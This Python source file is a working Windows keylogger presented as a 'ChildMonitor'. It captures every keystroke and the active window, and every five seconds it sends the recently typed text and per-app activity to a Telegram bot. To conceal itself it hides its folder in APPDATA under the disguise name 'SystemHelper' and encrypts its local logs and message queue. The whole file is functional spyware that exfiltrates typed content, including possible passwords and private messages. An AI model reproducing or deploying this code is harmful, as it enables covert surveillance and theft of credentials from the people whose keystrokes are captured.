import datetime
import json
import logging
import os
import queue
import string
import subprocess
import sys
import threading
import time
from collections import defaultdict, deque

import psutil
import requests
import win32api
import win32crypt
import win32event
import win32gui
import win32process
import winerror
from cryptography.fernet import Fernet
from decouple import config, Csv
from pynput import keyboard

print("Starting application...")

# ==== CONFIG AND SECRETS ====
try:
    print("Loading configuration...")
    TELEGRAM_TOKEN = config('TELEGRAM_TOKEN')
    TELEGRAM_CHAT_ID = config('TELEGRAM_CHAT_ID', cast=int)
    REPORT_INTERVAL = 5  # Fixed 5 seconds
    MAX_BUFFER_SIZE = config('MAX_BUFFER_SIZE', default=1000, cast=int)
    MAX_RETRIES = config('MAX_RETRIES', default=3, cast=int)
    IGNORE_PROCS = set(config('IGNORE_PROCS', default='', cast=Csv()))
    KEYSTROKE_CHUNK_SIZE = 30
    WINDOW_CHECK_INTERVAL = 0.5  # Faster window checking
    HEARTBEAT_INTERVAL = 60  # Faster heartbeat
    RETENTION_DAYS = 7

    print(f"Configuration loaded. Report interval: {REPORT_INTERVAL}s")

except Exception as e:
    print(f"Error loading configuration: {e}")
    sys.exit(1)

# Directory setup
try:
    print("Setting up directories...")
    BASE_DIR = os.path.join(os.getenv('APPDATA'), 'SystemHelper')
    LOG_FILE = os.path.join(BASE_DIR, 'activity.log.enc')
    QUEUE_FILE = os.path.join(BASE_DIR, 'msg_queue.dat')
    KEY_FILE = os.path.join(BASE_DIR, 'fernet.key.dat')
    PID_CACHE_FILE = os.path.join(BASE_DIR, 'pid_cache.json')

    os.makedirs(BASE_DIR, exist_ok=True)
    print(f"Base directory: {BASE_DIR}")

    try:
        subprocess.call(['attrib', '+h', BASE_DIR], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass

except Exception as e:
    print(f"Error setting up directories: {e}")
    sys.exit(1)

# Logger setup
logger = logging.getLogger('ActivityMonitor')
logger.setLevel(logging.INFO)

console_handler = logging.StreamHandler()
console_handler.setLevel(logging.INFO)
console_formatter = logging.Formatter('%(asctime)s %(levelname)s %(message)s')
console_handler.setFormatter(console_formatter)
logger.addHandler(console_handler)

file_handler = logging.FileHandler(os.path.join(BASE_DIR, 'monitor.log'), 'a', 'utf-8')
file_handler.setFormatter(logging.Formatter('%(asctime)s %(levelname)s %(message)s'))
logger.addHandler(file_handler)


class SecureKeyStore:
    def __init__(self, path_key):
        self.path_key = path_key
        self._load_or_generate()

    def _protect(self, data: bytes) -> bytes:
        return win32crypt.CryptProtectData(data, None, None, None, None, 0x4 | 0x1)

    def _unprotect(self, blob: bytes) -> bytes:
        return win32crypt.CryptUnprotectData(blob, None, None, None, 0x1)[1]

    def _load_or_generate(self):
        if os.path.exists(self.path_key):
            try:
                with open(self.path_key, 'rb') as f:
                    blob = f.read()
                raw = self._unprotect(blob)
            except Exception as e:
                logger.error(f'Failed to read key: {e}')
                sys.exit(1)
        else:
            raw = Fernet.generate_key()
            blob = self._protect(raw)
            with open(self.path_key, 'wb') as f:
                f.write(blob)

        self._fernet = Fernet(raw)

    @property
    def fernet(self):
        return self._fernet


class PidCache:
    def __init__(self, cache_file):
        self.cache_file = cache_file
        self.cache = {}
        self._load_cache()

    def _load_cache(self):
        if os.path.exists(self.cache_file):
            try:
                with open(self.cache_file, 'r') as f:
                    self.cache = json.load(f)
            except:
                self.cache = {}

    def save_cache(self):
        try:
            with open(self.cache_file, 'w') as f:
                json.dump(self.cache, f)
        except Exception as e:
            logger.error(f"Error saving cache: {e}")

    def get_process_name(self, pid):
        if pid in self.cache:
            return self.cache[pid]
        try:
            proc = psutil.Process(pid)
            name = proc.name().lower()
            self.cache[pid] = name
            return name
        except:
            return "unknown"


class TelegramSender:
    def __init__(self, token, chat_id):
        self.token = token
        self.chat_id = chat_id
        self.session = requests.Session()
        self.session.timeout = 10
        self.available = True
        self.last_check = 0

    def check_availability(self):
        if time.time() - self.last_check < 30:
            return self.available

        try:
            response = self.session.get(f'https://api.telegram.org/bot{self.token}/getMe', timeout=5)
            self.available = response.status_code == 200
        except:
            self.available = False

        self.last_check = time.time()
        return self.available

    def send_message(self, text):
        if not self.check_availability():
            return False

        try:
            # Split long messages
            for i in range(0, len(text), 4000):
                part = text[i:i + 4000]
                response = self.session.post(
                    f'https://api.telegram.org/bot{self.token}/sendMessage',
                    data={'chat_id': self.chat_id, 'text': part, 'parse_mode': 'Markdown'},
                    timeout=10
                )
                if response.status_code != 200:
                    logger.warning(f"Send failed: {response.status_code}")
                    return False
            return True
        except Exception as e:
            logger.error(f"Send error: {e}")
            return False


class ChildMonitor:
    def __init__(self):
        self.activity_map = defaultdict(lambda: {
            'time': 0.0,
            'keystrokes': 0,
            'key_types': defaultdict(int)
        })
        self.log_buffer = deque(maxlen=MAX_BUFFER_SIZE)
        self.msg_queue = queue.Queue()
        self.activity_lock = threading.RLock()
        self.exit_event = threading.Event()
        self.last_report_time = time.time()

        self.current_proc = None
        self.last_hwnd = None
        self.hwnd_change_time = time.time()

        self.typed_content = {'text': '', 'start_time': time.time(), 'last_time': time.time()}
        self.TYPING_TIMEOUT = 3.0

        self.pid_cache = PidCache(PID_CACHE_FILE)
        self.secure_store = SecureKeyStore(KEY_FILE)
        self.fernet = self.secure_store.fernet
        self.telegram = TelegramSender(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID)

        self._load_queue()
        self._clean_old_files()

        # Start threads
        self.listener = keyboard.Listener(on_press=self._on_press)
        self.listener.start()

        threading.Thread(target=self._send_worker, daemon=True).start()
        threading.Thread(target=self._window_check_worker, daemon=True).start()
        threading.Thread(target=self._report_timer, daemon=True).start()

        logger.info(f"Monitor started - reporting every {REPORT_INTERVAL} seconds")

    def _clean_old_files(self):
        try:
            now = time.time()
            cutoff = now - (RETENTION_DAYS * 86400)

            for file in os.listdir(BASE_DIR):
                path = os.path.join(BASE_DIR, file)
                if os.path.isfile(path) and os.path.getmtime(path) < cutoff:
                    os.remove(path)
        except:
            pass

    def _report_timer(self):
        """Send reports every 5 seconds precisely"""
        while not self.exit_event.is_set():
            try:
                self._send_report()
                time.sleep(REPORT_INTERVAL)
            except Exception as e:
                logger.error(f"Report timer error: {e}")
                time.sleep(1)

    def _get_proc_name(self, hwnd):
        try:
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            if pid == 0:
                return None

            window_title = win32gui.GetWindowText(hwnd)
            if window_title:
                parts = window_title.split(' - ')
                if len(parts) > 1:
                    return parts[-1].strip().lower()

            return self.pid_cache.get_process_name(pid)
        except:
            return None

    def _update_activity_time(self):
        now = time.time()
        if self.current_proc and self.current_proc not in IGNORE_PROCS:
            elapsed = now - self.hwnd_change_time
            with self.activity_lock:
                self.activity_map[self.current_proc]['time'] += elapsed
        self.hwnd_change_time = now

    def _check_window_change(self):
        try:
            hwnd = win32gui.GetForegroundWindow()
            if hwnd != self.last_hwnd:
                self.last_hwnd = hwnd
                proc = self._get_proc_name(hwnd)

                self._update_activity_time()

                if proc != self.current_proc:
                    self.current_proc = proc
                    self.typed_content = {'text': '', 'start_time': time.time(), 'last_time': time.time()}

                return True
        except:
            pass
        return False

    def _window_check_worker(self):
        while not self.exit_event.is_set():
            try:
                self._check_window_change()
                time.sleep(WINDOW_CHECK_INTERVAL)
            except:
                pass

    def _get_key_representation(self, key):
        if hasattr(key, 'char') and key.char:
            return key.char
        elif key == keyboard.Key.space:
            return " "
        elif key == keyboard.Key.enter:
            return "\n"
        elif key == keyboard.Key.tab:
            return "\t"
        elif hasattr(key, 'name'):
            return f"[{key.name}]"
        else:
            return f"[{key}]"

    def _categorize_key(self, key):
        if hasattr(key, 'char') and key.char:
            char = key.char
            if char.isalpha():
                return 'Letters'
            elif char.isdigit():
                return 'Numbers'
            elif char in string.punctuation:
                return 'Punctuation'
            elif char.isspace():
                return 'Whitespace'
            return 'Special'

        if hasattr(key, 'name'):
            name = key.name.lower()
            if name in ['enter', 'tab', 'backspace', 'delete']:
                return 'Navigation'
            elif name in ['shift', 'ctrl', 'alt']:
                return 'Modifiers'
            elif name.startswith('f') and name[1:].isdigit():
                return 'Function'
            return 'Special'

        return 'Unknown'

    def _on_press(self, key):
        try:
            self._check_window_change()

            if not self.current_proc or self.current_proc in IGNORE_PROCS:
                return

            now = time.time()
            key_repr = self._get_key_representation(key)

            # Update typing content
            if now - self.typed_content.get('last_time', 0) > self.TYPING_TIMEOUT:
                self.typed_content = {'text': '', 'start_time': now, 'last_time': now}
            else:
                self.typed_content['last_time'] = now

            if key == keyboard.Key.backspace:
                if self.typed_content.get('text'):
                    self.typed_content['text'] = self.typed_content['text'][:-1]
            elif key_repr not in ['[shift]', '[ctrl]', '[alt]']:
                self.typed_content['text'] += key_repr

            # Log keystroke
            entry = f"{datetime.datetime.now():%H:%M:%S}|{self.current_proc}|{key_repr}"
            self.log_buffer.append(entry)

            # Update activity stats
            key_type = self._categorize_key(key)
            with self.activity_lock:
                self.activity_map[self.current_proc]['keystrokes'] += 1
                self.activity_map[self.current_proc]['key_types'][key_type] += 1

        except Exception as e:
            logger.error(f"Keypress error: {e}")

    def enqueue(self, item):
        item['retries'] = 0
        item['timestamp'] = time.time()
        self.msg_queue.put(item)

    def _send_worker(self):
        while not self.exit_event.is_set():
            try:
                item = self.msg_queue.get(timeout=2)

                success = False
                if item['type'] == 'text':
                    success = self.telegram.send_message(item['text'])

                if not success:
                    item['retries'] += 1
                    if item['retries'] <= MAX_RETRIES:
                        time.sleep(min(2 ** item['retries'], 30))
                        self.msg_queue.put(item)
                    else:
                        logger.error(f"Dropping message after {item['retries']} retries")

                self.msg_queue.task_done()

            except queue.Empty:
                continue
            except Exception as e:
                logger.error(f"Send worker error: {e}")

    def _send_report(self):
        try:
            report_end_time = time.time()
            tracking_seconds = report_end_time - self.last_report_time

            self._update_activity_time()

            with self.activity_lock:
                total_keys = sum(data['keystrokes'] for data in self.activity_map.values())

                # Create report
                timestamp = datetime.datetime.now().strftime("%H:%M:%S")
                report_text = f"🔄 *{timestamp}* ({tracking_seconds:.1f}s)\n"
                report_text += f"⌨️ **{total_keys} keystrokes**\n"

                if self.activity_map:
                    active_apps = [(proc, data['keystrokes']) for proc, data in self.activity_map.items()
                                   if data['keystrokes'] > 0]
                    active_apps.sort(key=lambda x: x[1], reverse=True)

                    report_text += "\n📱 *Active apps:*\n"
                    for proc, keys in active_apps[:5]:  # Top 5
                        report_text += f"▪ `{proc}`: {keys} keys\n"

                # Current window
                current = self.current_proc or "Unknown"
                report_text += f"\n🖥️ *Current:* `{current}`"

                # Typing sample
                now = time.time()
                if (self.typed_content.get('text') and
                        now - self.typed_content.get('last_time', 0) < 30):
                    sample = self.typed_content['text'][-150:].strip()
                    if sample:
                        report_text += f"\n\n✍️ *Recent typing:*\n```\n{sample}\n```"

                self.enqueue({'type': 'text', 'text': report_text})

                # Reset for next report
                self.activity_map.clear()
                self.last_report_time = report_end_time

                logger.info(
                    f"Report sent: {total_keys} keys, {len(active_apps) if 'active_apps' in locals() else 0} apps")

        except Exception as e:
            logger.error(f"Report error: {e}")

    def _save_queue(self):
        try:
            items = []
            while not self.msg_queue.empty():
                items.append(self.msg_queue.get())
                self.msg_queue.task_done()

            for item in items:
                self.msg_queue.put(item)

            if items:
                with open(QUEUE_FILE, 'wb') as f:
                    data = json.dumps(items).encode()
                    encrypted = self.fernet.encrypt(data)
                    f.write(encrypted)
        except Exception as e:
            logger.error(f'Queue save error: {e}')

    def _load_queue(self):
        if not os.path.exists(QUEUE_FILE):
            return

        try:
            with open(QUEUE_FILE, 'rb') as f:
                encrypted = f.read()
                data = self.fernet.decrypt(encrypted).decode()
                items = json.loads(data)
                for item in items:
                    self.msg_queue.put(item)
        except Exception as e:
            logger.error(f'Queue load error: {e}')

    def _cleanup(self):
        try:
            logger.info("Cleaning up...")
            self.exit_event.set()

            if self.listener.is_alive():
                self.listener.stop()

            self._update_activity_time()
            self.pid_cache.save_cache()
            self._save_queue()

        except Exception as e:
            logger.error(f"Cleanup error: {e}")

    def run(self):
        logger.info("Monitor running - sending reports every 5 seconds")
        try:
            while not self.exit_event.is_set():
                time.sleep(1)
        except KeyboardInterrupt:
            logger.info("Keyboard interrupt")
            self._cleanup()


if __name__ == '__main__':
    try:
        # Check for duplicate process
        mutex = win32event.CreateMutex(None, False, "Global\\SystemHelperMonitor")
        if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
            print("Already running")
            sys.exit(0)

        monitor = ChildMonitor()
        monitor.run()

    except Exception as e:
        logger.error(f"Critical error: {e}")
        sys.exit(1)
